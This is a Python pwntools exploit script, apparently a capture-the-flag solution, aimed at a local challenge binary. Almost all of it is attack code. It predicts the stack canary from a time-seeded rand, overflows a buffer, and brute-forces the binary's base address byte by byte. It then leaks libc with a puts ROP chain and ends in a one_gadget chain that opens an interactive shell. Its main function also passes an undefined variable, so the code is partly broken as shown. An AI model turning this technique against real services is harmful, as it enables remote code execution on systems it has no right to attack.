#!/usr/bin/env python
"""Exploit script template."""
import subprocess
import sys
from ctypes import cdll

from pwn import *

context.log_level = 'debug'

BINARY = './src/chall'
LIB = '/lib/x86_64-linux-gnu/libc.so.6'
HOST = 'localhost'
PORT = 4444

GDB_COMMANDS = ['b main']


c_lib = cdll.LoadLibrary(LIB)

def run(payload, return_con=False):
    p = remote(HOST, PORT)
    c_lib.srand(c_lib.time()+1)
    cookie = p32(c_lib.rand()) + p32(c_lib.rand())
    cookie = u64(cookie) & 0xffffffffffffff

    rbp = p64(context.binary.address + 0x4800) if context.binary.address else b'B'*8
    actual_payload = b'A'*0x408 + p64(cookie) + rbp + payload

    p.sendlineafter('ride?', str(len(actual_payload)))
    p.sendlineafter('to?\n', actual_payload)
    if return_con:
        return p
    try:
        p.recvuntil("Whatever!\n")
        result = p.recvline()
        if b'stack smash' in result:
            p.close()
            return run(payload)
    except EOFError:
        return False

    return b'Bye' in result


def get_bin_leak(bin_leak=b''):
    while len(bin_leak) < 8:
        log.info(f'current leak: {bin_leak}')

        if len(bin_leak) >= 6 or len(bin_leak) < 0:
            r = range(256)
        else:
            r = range(255, 0, -1)

        for b in r:
            log.info(f'trying b = 0x{b:x}')
            payload = bin_leak + bytes([b])

            if run(payload):
                bin_leak += bytes([b])
                break

    return bin_leak


def get_libc_leak():
    pop_rdi = 0x1983  # Depends on binary
    plt_puts = 0x11d0  # Depends on binary

    rop = lambda x: context.binary.address + x
    ropchain = [
        rop(pop_rdi),
        context.binary.sym['puts'],
        rop(plt_puts),
    ]

    p = run(b''.join(map(p64, ropchain)), return_con=True)
    p.recvuntil(b'\n')
    leak = u64(p.recvuntil(b'\n', drop=True).ljust(8, b'\0'))
    return leak


def one_shot(libc):
    one_gadget = 0xe6e79
    pop_rsi = 0x27529  # pop rsi; ret;
    pop_rdx_rbx = 0x162866  # pop rdx; pop rbx; ret;

    rop = lambda x: libc.address + x
    ropchain = [
        rop(pop_rsi),
        0,
        rop(pop_rdx_rbx),
        0,
        0,
        rop(one_gadget),
    ]

    p = run(b''.join(map(p64, ropchain)), return_con=True)
    p.interactive()


def exploit(mode, libc):
    bin_leak = u64(get_bin_leak().ljust(8, b'\0'))
    context.binary.address = (bin_leak - 0x1500) & ~0xfff
    log.info(f'bin @ address 0x{context.binary.address:x}')

    libc_leak = get_libc_leak()
    libc.address = libc_leak - libc.sym['puts']
    log.info(f'libc @ address 0x{libc.address:x}')

    one_shot(libc)


def main():
    """Does general setup and calls exploit."""
    try:
        context.binary = ELF(BINARY)
    except IOError:
        print(f'Failed to load binary ({BINARY})')

    libc = None
    try:
        libc = ELF(LIB)
        env = os.environ.copy()
        env['LD_PRELOAD'] = LIB
    except IOError:
        print(f'Failed to load library ({LIB})')

    exploit(mode, libc)


if __name__ == '__main__':

    main()
